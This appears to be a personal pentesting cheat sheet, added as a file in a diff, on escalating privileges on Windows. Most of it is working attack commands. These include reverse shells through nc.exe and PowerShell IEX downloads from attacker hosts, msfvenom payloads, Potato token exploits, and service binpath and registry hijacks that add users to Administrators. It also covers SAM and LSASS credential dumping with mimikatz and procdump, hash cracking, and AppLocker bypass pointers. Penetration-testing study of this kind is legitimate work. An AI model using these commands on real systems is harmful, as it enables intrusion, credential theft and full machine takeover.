@@ -1,0 +1,525 @@
+WINDOWS PRIVILIEGE ESCALATION:
+=============================
+Basics:
+	our goal is to get admin or system shell
+	SYSTEM account:(NT Authority/System)
+		It's an internal account that isn't shown inser control panel or anywhere else. It has same privileges as ADMINISTRATOR, But both of them have different functions.
+	SAM(security accounts manager):(c:\windows\system32\config\SAM)
+		Database having user accounts with hashed passwords
+			Hash_format:
+				username:useris:lan_manager_hash:NTLM_hash
+				NTLM(NT LAN Manager):MD4
+				LM Hash:DES Encryption
+	Windows Vault:(Credential Manager)	
+		stores credentials using which Windows log in the users automatically, which means that any Windows application that needs credentials to access a resource can make use of CWindows Vault and use the credentials supplied instead of users entering the username and password all the time.
+	UAC:(User Access Control)
+	PowerShell: See PowerShell For Pentesting
+	CommandPrompt: See CommandPrompt For Pentesting	
+	ACL:(Acess Control List)
+		A user/group access a resource(file/registery/service) on basis of ACL. 
+		It provides permission
+		Can be chacked via 2 ways:
+			Accesscheck.exe => available both in cmd and ps
+			Get-ACL => available in ps
+	Windows Registry Fundamentals:
+		Registeries are of 2 types:
+			HKLM => LM means Local Machiene
+			HKCU => CU means Current User
+		Registry has keys like HKLM\Software\policies\windows\installer
+		we can see Data inside keys:
+			cmd> req query HKLM\Software\policies\windows\installer
+	Sysinternal Tools:
+		accesscheck.exe:
+			This utility tells the permission that a user has for file/folder/registry
+			Availabel in cmd
+			accesscheck.exe -ucqv service_name => checks if we have read/write access to a service
+			accesscheck.exe -wvu "c:\a\b\c\d" => checks permissions in a folder
+				w => only show those enteries having "write"
+				v => verbose
+				u => ignore errors
+		autorun.exe:
+			it show autorun files
+		procdump.exe:
+			procdump.exe -accepteula -ma lsass.exe lssas.dmp => creating a dumpo of 
+	important cmd tools:
+		cacls:
+			previously known as icacls
+			it is used to EDIT permission of files
+			cacls /t root.txt /e /p user_name:F
+			options:
+				/t => file name
+				/e => edit the following object
+				/p => permission (an object)
+				/grant => it is same as /e /p combined
+				F => Full access
+Automated tools and their execution:
+	execuatbles:(need to conv from .sln to .exe)
+		winpeas.sln:(best)
+		seatbelt.sln:
+		watson.sln:(by RastaMouse)
+			it looks for CVE's
+			it depends on .net version of box, to check it
+				windows\microsoft.net\framework\v2.0.50727\msbuild -version
+		sharup.sln:
+			same as powerup.ps1
+			we can get precomplied binary online
+		to make .exe from .sln:
+			open them in visual studio and right-click -> build
+			go to bin folder, we will find our executable
+	powershell scripts:
+		Note:
+			ps> PowerShell -exec bypass
+		sherlock.ps1:
+			runs on its own
+			looks for cve's
+			edit it as follows:	
+				append "Find-AllVulns"
+		jaws-enum.ps1:
+			it runs automatically, once IEX is finished
+		powerup.ps1:
+			looks for juicy stuff and PE vectors
+			its a part of "powersploit", a suite of different powershell scripts
+			>. ./powerup.ps1
+			>Invoke-AllChecks
+	others:
+		Windows Exploit Suggesters:
+			Windows expoit suggester:
+				https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+				windows-exploit-suggester.py --update
+				windows-exploit-suggester --database <> --systeminfo <>
+				Issue:
+					its not working in kali as its written in python2 and needs a package which can only be installed using python-pip (no longer availabel in kali)
+			wesng:(Windows Exploit Suggester Next Generation)
+				https://github.com/bitsadmin/wesng
+				wes.py --update
+				wes.py systeminfo.txt -e
+					-e => show only those vuln which have an exploit
+		post/recon/multi/local_exploit_suggester
+	based on which shell we have:
+		when we ONLY have CMD shell avilable:
+			winpeas.sln
+			seatbelt.sln
+			watson.sln
+			sharup.sln
+				cmd>abcd.exe
+			windows-exploit-suggester.py 
+			msf>local_exploit_suggester
+		When we have PS, but we cant download any file:
+			jaws-enum.ps1:
+				it runs automatically, once IEX is finished.
+			sherlock.ps1
+		When we have PS, and we can download any file:
+			powerup.ps1
+		when we want to use PS, but from cmd:
+			powershell \" IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename') \" => we need to use \"\" to download files from cmd using powershell
+Manual Enumeration:
+	Username:
+		whoami
+		echo %userdomain%
+		echo %username%
+		echo %USERNAME%
+		set => shows all enviroment vairables
+		SET U => It will return any environment variables that start with U.
+		A bunch of environment variables have the user:
+			TEMP=C:\DOCUME~1\User\LOCALS~1\Temp
+			TMP=C:\DOCUME~1\User\LOCALS~1\Temp
+			USERNAME=user
+			USERPROFILE=C:\Documents and Settings\user
+		If nothing works, transfer whoami.exe from kali to windows using smbserver
+	systeminfo
+	hostname
+	net user => list all users
+	net localgroup
+	ipconfig /all & route print & arp -a => Network information
+	netstat -ano => List open connections
+	netsh firewall show state => firewall info
+	netsh firewall show config
+	services:
+		net start
+		wmic service list brief
+		tasklist /SVC
+ADS:(alternate data stream)
+	dir /r => to see if ADS exists
+		file1.txt:file2.txt => yes
+	powershell:
+		PS> get-item .\file.txt -stream * => show all stream names
+		PS> get-item .\file.txt -stream stream_name.txt => see data of that stream
+		PS> set-content -path file1_path -stream stream_name => add stream
+		PS> remove-item –path file1_path –stream stream_name => remove stream
+	command prompt:
+		cmd> powershell (get-content file.txt -stream stream_name.txt)
+		cmd> notepad file1.txt:file2.txt => see ADS
+		cmd> echo "abcd" > file1.txt:file2.txt => create ADS
+APPLOCKER Bypass:
+	Applocker blocks execution of scripts in cmd and PS
+	github => ultimateapplockerbypasslist by api0cradle
+Windows Subsystem for linux:
+	2016 onwards
+	allows linux over windows
+	wsl.exe + bash.exe
+	locating them:
+		where \R C:\ bash.exe
+		where \R C:\ wsl.exe
+			\R => recursive
+		wsl.exe whoami
+			mostly we are ROOT in WSL
+		bash.exe => it will give us a linux shell
+			convert it to a TTY shell
+			NOTE: always look at .bash_history
+			>history => same as .bash_history
+Windows XP sp1 exploitation:
+	https://guide.offsecnewbie.com/privilege-escalation/windows-pe
+	Do these:
+		sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
+		sc config upnphost obj= ".\LocalSystem" password= ""
+		sc qc upnphost
+		sc config SSDPSRV start= auto
+		net start SSDPSRV
+		net start upnphost
+	We will get NT Authority/SYSTEM
+Kernel Exploitation:
+	cmd> systeminfo => know the system info
+	we can use windows_exploit_suggester/watson.exe
+	msf> post/windows/gather/enum_patches => hotfixes
+	github.com/secwiki/windows-kernel-exploits/ => windows kernel exploits exe and poc
+Token impersonation and potato attack:
+	Basics:
+		Tokens:
+			Temp keys that allows us to access a system/network without credentials. They are like COOKIES,but for windows.
+			Two types of tokens:
+				Delegate:
+					These are created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop. 
+				Impersonate:
+					These are created for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.
+				When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token.
+		finding tokens:
+			C:\> whoami /priv => it will show prvileges
+			meterpreter> getprivs
+		Vulnerable tokens:
+			SEImpersonatePrivilege
+			SEAssignPrimaryToken
+	Using Meterpreter:(automated way)
+		load incognito => a module foe token exploitaion and impersonation
+		list_tokens -u => lists the availabel tokens
+		Impersonate_token "token_name" => it will impersonate the specified token 
+	Potato Exploits:(manual way)
+		Hot-Potato->RottenPotato->RottenPotatoNG->LonelyPotato->JuicyPotato->RoguePotato->JuicyPotato_2
+		HotPotato:(https://github.com/foxglovesec/Potato)
+			For Windows 7/8/10 and Server 2008/2012
+			usage:
+				no longer in use
+				executable => https://github.com/foxglovesec/Potato
+				powershell script =>  https://github.com/Kevin-Robertson/Tater
+					it is PS version of potato exploit
+		RottenPotato:(https://github.com/foxglovesec/RottenPotato)
+			aka ms16_075_reflection in metasploit
+			Usage:
+				no longer in use => github page says shift to RottenPotatoNG
+		RottenPotatoNG:(https://github.com/breenmachine/RottenPotatoNG)
+			Basically RottenPotatoNG is version2 of RottenPotato
+			Usage:
+				After having a meterpreter shell with incognito mode loaded:
+					MSFRottenPotato.exe t c:\windows\temp\test.bat
+		LonelyPotato:(https://github.com/decoder-it/lonelypotato)
+			Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module
+			usage:	
+				no longer in use. The github link says "shift to juicy-potato"		
+		JuicyPotato:(https://github.com/ohpe/juicy-potato/releases)
+			aka ms16_075_reflection_juicy in metasploit
+			If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
+			Usage:
+				JuicyPotato -l lport -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe lhost lport" -t * => to use nc.exe
+				JuicyPotato.exe -l lport -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://lhost:8080/rev.ps1')" -t * => to use ps reverse shell
+				flags:
+					-l lport
+					-p c:\windows\system32\cmd.exe
+						we always use "\system32\cmd.exe" is SYSTEM shell
+					-a "arguments to pass to program(-p)"
+						example:
+							-a "/c c:\users\public\desktop\nc.exe -e cmd.exe lhost lport"
+					-t *
+						it defines createprocess call:
+							t => CreateProcessWithTokenW
+							u => CreateProcessAsUser
+							* => both
+					-c {clsid_value}:
+						https://ohpe.it/juicy-potato/CLSID/ => list of clsids based on OS
+						default => {4991d34b-80a1-4291-83b6-3328366b9097}
+					Optional:
+						-m <ip>: COM server listen address (default 127.0.0.1)
+						-k <ip>: RPC server ip address (default 127.0.0.1)
+						-n <port>: RPC server listen port (default 135)
+						-z only test CLSID and print token's user
+			Note:
+				Use LovelyPotato
+		LovelyPotato:(https://github.com/TsukiCTF/Lovely-Potato)
+			Its a Powershell wrapper of JuicyPotato for easy exploitation
+			Why Use Lovely Potato:
+				For simplicity. Manually uploading various files to target host can be easily avoided with automation. Also, listing entire CLSIDs on the system and identifying privilege for each of them takes very long time if done by sending commands. You can easily switch binaries in the repo any time without having to recode Invoke-LovelyPotato.ps1. Ex) Recompiling JuicyPotato for customization / Obfuscating your meterpreter for AV evasion
+			Usage:
+				Modify the two following variables in 'Invoke-LovelyPotato.ps1':
+					$RemoteDir = "http://[AttackerIP]
+					$LocalPath = "[WritablePathOnVictimMachine]"
+						any path in which we can write files
+						C:\>mkdir temp2
+				Create a payload:
+					msfvenom -p windows/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
+					 	Note: name must be meterpreter.exe
+				python3 -m http.server 80
+				nc -nvlp 4444
+				On the initial shell:
+					 IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
+			Note:
+				this exploit takes roughly 10-20 mins to run, so dont panic and just wait.
+				we can track progress as follows:
+					go to the directory($LocalPath mentioned in Invoke-LovelyPotato.ps1):
+						type result.log
+		RoguePotato:(https://github.com/antonioCoco/RoguePotato)
+			Released on 11 may 2020
+			If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
+			Usage:
+				.\RoguePotato.exe -r lhost -e "C:\windows\system32\cmd.exe /c {command}" -l lport
+				flags:
+					-r lhost
+					-e program
+					-l lport
+					-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+		SweetPotato:(https://github.com/CCob/SweetPotato)
+			Released on 13 may 2020
+			The tool was designed to be used with Cobalt Strike’s execute-assembly command, so it carries no baggage in the form of dependencies
+			Usage:
+				flags:
+					-c, --clsid=VALUE          CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)
+					-m, --method=VALUE         Auto,User,Thread (default Auto)
+					-p, --prog=VALUE           Program to launch (default cmd.exe)
+					-a, --args=VALUE           Arguments for program (default null)
+					-e, --exploit=VALUE        Exploit mode [DCOM|WinRM|PrintSpoofer(default)]
+					-l, --listenPort=VALUE     COM server listen port (default 6666)
+					-h, --help                 Display this help
+		JuicyPotato_2:(https://github.com/decoder-it/juicy_2)
+			Released on 30 may 2020
+			JuicyPotato for Win10 > 1803 & Win Server 2019
+			IDK the difference between juicy2 and RoguePotato, consider the following links:
+				https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
+				https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf
+		Note:
+			CLSID(Class ID) is a globally UUID that identifies a COM class object.
+runas.exe:(c:\windows\system32\runas.exe)
+	Its a windows utility which allows users to run some command using privileges of another user
+	c:/> cmdkey /list => shows currently stored credentials
+	c:/> c:\windows\system32\runas.exe /user:hostname\username /savecred "c:\windows\system32\cmd.exe" /c command_to_run => it will run command as the user_name
+Startup Application:(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup)
+	discovery:
+		accesscheck.exe -wvu "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+	exploitation:
+		we place malicious.exe in "startup" folder and reboot system and wait for admin to log-in.
+	requirement:
+		administrator should log-in after reboot!
+Service Exploitation:
+	Basics:
+		Services are mainly progs that run in background
+		A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP.
+		You can replace the binary with a reverse shell or a command that creates a new user and adds it to the Administrator group, restart the service and get system.
+		To start/stop a service:
+			1. wmic service NAMEOFSERVICE call startservice	
+			2. net stop [service name] && net start [service name]
+			3. sc start/stop serviceName
+	Enumeration:
+		Powerup.ps1 Invoke-AllChecks => this will show all services
+		accesscheck.exe -uwcv Everyone * => manaul way to see which servies have W permission
+			c => show service name
+			Everyone => its a group name
+			it will show us any service having write permission
+		Note:
+			we need to find a service which:
+				can be RW
+				can be restarted (can be found out via powerup.ps1)
+	Binary paths:(binpath)
+		Basics:
+			The “binPath” is the location that points the service to the binary that need to execute when the service is started.
+		Exploitation:(getting a new shell)
+			msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
+				transfer this shell to victim machiene
+			sc qc service_name => it will show binary path name
+			sc config service_name binpath="C:\windows\system32\shell.exe"
+			sc start service_name => it will start service again, resulting in us becoming admin
+		Exploitation:(running a command to become admin)
+			sc qc service_name => it will show binary path name
+			sc config service_name binpath= "net localgroup administrators user/add"
+			sc start service_name => it will start service again, resulting in us becoming admin
+	Unquoted service paths:
+		Basics:
+			when a service dont has its path enclosed in quotes AND the path contains space, then its vulnerable.
+			lets say an executable is located at c:\p1\p p\p p p\ex.exe, in such cases, the service starts to look for its execuatble by going from directory to directory like this:
+				c:\something.exe -> c:\p1\something.exe -> c:\p1\p p\something.exe and so on
+		Exploitation:
+			we place a malicious execuatble in any of subdirectories of path, where we have write permission
+				we find permissions using "accesscheck" utility
+			sc start service_name
+	Insecure Service Executable:
+		some executables are attached to services, so we manipulate those excutables and restart the service to exploit
+		Exploitation:
+			create malc.exe using msfvenom and transfer it to folder of executable-to-exploit
+			cmd>sc start service_attached_to_executable
+	regsvc:(Registry Service)
+		Basics:
+			Windows Registery stores enteries for each service and each entry can have ACLs.
+			We can exploit these ACLs if we cant expoit the services directly
+			To check ACL:
+				PS> Get-ACL -path hklm:\system\currentcontrolset\services\regsvc | format-list
+					if output is NT Authority\user Full_Access => boom
+			We add malc.exe to regsvc and then restart the service
+		Explotation:
+			create malc.exe using msfvenom and transfer it to c:/temp
+			cmd> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+				reg add => add to this registry
+				/v => add into the following key
+				"ImagePath" => a registry-key of "regsvc" which stores path of drivers images file. it will store path of our executable file and run it.
+				/t => type
+				REG_EXPAND_SZ => it tells "ImagePath" will store a string in it
+					string_value => "/d c:\temp\x.exe"
+				/d => data
+				/f => dont prompt anything, do it quietly.
+			cmd> sc start regsvc ( restarting service)
+	DLL Hijacking:(Dynamic Link Library Hijacking)
+		Basics:
+			Programs usually can't function by themselves, they have a lot of resources they need to hook into. If a program/service loads a dll using absolute path, then we can abuse that to pop a shell with the privileges the program runs with.
+			Generally, a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order.
+			if a dll file dont exists in c:\file.exe, then the checking order is:
+				directory of program
+				c:\windows\system32
+				c:\windows\system
+				c:\windows
+				current working directory
+				directroies in PATH env (system then user)
+			DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one.
+		Exploiation:
+			msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
+			transfer msf.dll and PowerSploit/CodeExecution/Invoke-DllInjection.ps1 to windows
+			start handler
+			cmd> powershell "invoke-DLLinjection.ps1 -ProcessID <pid> c:/----/msf.dll"
+Registry Exploits:
+	Autorun Programs:
+		Discovery:
+			powersploit/winpeas
+			if we have rdp(3309) available, then, in rdesktop download "autorun.exe" and run it. it will show us autorun files
+				In LOGON tab, we see those files which will run as user who logs_out and logs_in
+			to check folder permission(r/w/x) of autorun program
+				accesscheck.exe -wvu "path-to-folder"
+				w => only show those enteries having "write"
+				v => verbose
+				u => ignore errors
+				if we have ALL_ACCESS, we are good to go!
+		Exploiation:
+			create malicious.exe and transfer it to folder of autorun program
+			then, admin logs_in and logs_off, so that we get a shell as admin
+		Requirement:
+			admin should log_in and log_out.
+	AlwaysInstallElevated:
+		If it is enabled, then any user can install .msi(microsoft installer) files as NT AUTHORITY\SYSTEM.
+		Discovery:
+			cmd> req query HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\INSTALLER
+			cmd> req HKCU\SOFTWARE\POLICIES\MICROSOFT\Windows\INSTALLER
+			If the value of REG_DWORD of "AlwaysInstallElevated" 0x1, then user of any privilege level is allowed to install .msi files as NT AUTHORITY\SYSTEM.
+		Exploiation:
+			Manual:
+				generate a .msi file using msfvenom
+				start a handler
+				transfer file to c:\temp
+				C:\>msiexec /quiet /qn /i C:\temp\malicious.msi
+			Automated:
+				msfconsole => exploit/windows/local/always_install_elevated
+Credentials mining:
+	Dumping Sam file:
+		dumping windows hashes using registery hives:
+			C:\> mkdir temp
+			C:\> reg.exe save hklm\sam c:\temp\sam.save
+			C:\> reg.exe save hklm\security c:\temp\security.save
+			C:\> reg.exe save hklm\system c:\temp\system.save
+			tranfer these using smbserver
+			secretsdump.py -sam sam.save -security security.save -system system.save LOCAL => gives ntlm hashes
+		mimikitaz:
+			C:\>~mimikitaz.exe
+			mimikitaz#privilege::debug
+			mimikitaz#token::elevate
+			mimikitaz#lsadump::sam => dump SAM
+		meterpreter:
+			hashdump
+	Using SAM and system to grab hashes:
+		secretsdump.py -sam SAM -system SYSTEM local => gives ntlm hashes
+			Full guide of secretsdump.py is in Active Directory sheet
+		samdump2 SYSTEM SAM
+	Cracking ntlm hashes:
+		https://samsclass.info/123/proj10/px16-hashcat-win.htm
+		hashcat -m 1000 -a 0 -o out.txt hashes.txt wordlist.txt
+	Memory Password mining:	
+		"Procdump" (sysinternals tool) is used to dump processes in memory, Services like FTP have credentials in clear text in memory.So, we can dump memory and read the credentials.
+		NOTE: we need to transfer procdump.exe to vicitim firstly.
+		procdump.exe -accepteula -ma lsass.exe lsass.dmp
+		then copy dump file to local windows machine of same arch
+		cmd> mimikatz.exe
+			sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp
+	Password hunting:
+		Automated:
+			winpeas do it automatically 
+		Manual:
+			findstr /si password *.txt *.ini *.config
+			dir /s *pass* == *cred* == *vnc* == *.config*
+			Searching in Registry Keys:
+				Passwords:
+					reg query HKLM /f password /t REG_SZ /s
+					reg query HKCU /f password /t REG_SZ /s
+				SSH keys:	
+					SSH private keys can be stored inside the registry key "HKCU\Software\OpenSSH\Agent\Keys"
+					reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
+					once found, they can be decrypted using::
+						https://github.com/ropnop/windows_sshagent_extract
+	Msfconsole:
+		post/windows/gather/credentials/*
+		post/windows/gather/enum_unattend
+	Once we get the creds:
+		If we have hash:
+			pass-the-hash => Read in "Active Directory"
+		If we have cleartext creds:
+			winexe:
+				winexe -U 'username%pass' //ip cmd.exe
+				winexe -U 'admin%pass' //ip cmd.exe => gives admin shell
+				winexe -U 'admin%pass' --system //ip cmd.exe => gives system shell
+Nishang:
+	it is a collection of powershell scripts which helps in getting a powershell reverse shell
+	shells/Invoke-PoweshellTcp:
+		append in it:
+			Invoke-PoweshellTcp -Reverse -IPAddress tun0 -port 5566
+		nc -nvlp 5566
+		and somehow transfer it to shell of victim using IEX in Powershell, it will execute on it own after downloading.
+Winrm Pentesting: see Active information gathering
+file transfer:
+	Downloadind and Sending files from windows:
+		Using ftp:
+			kali> python3 -m pyftpdlib -p 21 --write
+			cmd>ftp my_ip
+				ftp> user:anonymous
+				ftp> password:anonymous
+				ftp> put file.exe
+				Note:
+					windows has inbuilt ftp
+		Using smb: Covered in SMB Server For Pentesting sheet
+	Downloading files:
+		cmd:
+			certutil -urlcache -f http://ip/filename outfile_name
+				-f => file
+			bitsadmin /transfer transfName /priority high http://abcd.com/file.pdf C:\downloads\file.pdf
+		powershell
+			powershell -c (New-Object Net.WebClient).DownloadFile('http://ip/filename', 'savename')
+			powershell IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename')
+		wget.vbs:
+			in pwk2020 folder
+			we can make it in victim by following comds on page 483 pwk2020
+			cscript wget.vbs http://ip/filename savename
+Tools for Remote Execution:
+	Can be used in ptp/pth
+	psexec.py: Read in Active Directory sheet	
+	smbexec.py: Read in Active Directory sheet	
+	atexec.py: Read in Active Directory sheet	
+	wmiexec.py: Read in Active Directory sheet	
+	dcomexec.py: Read in Active Directory sheet	
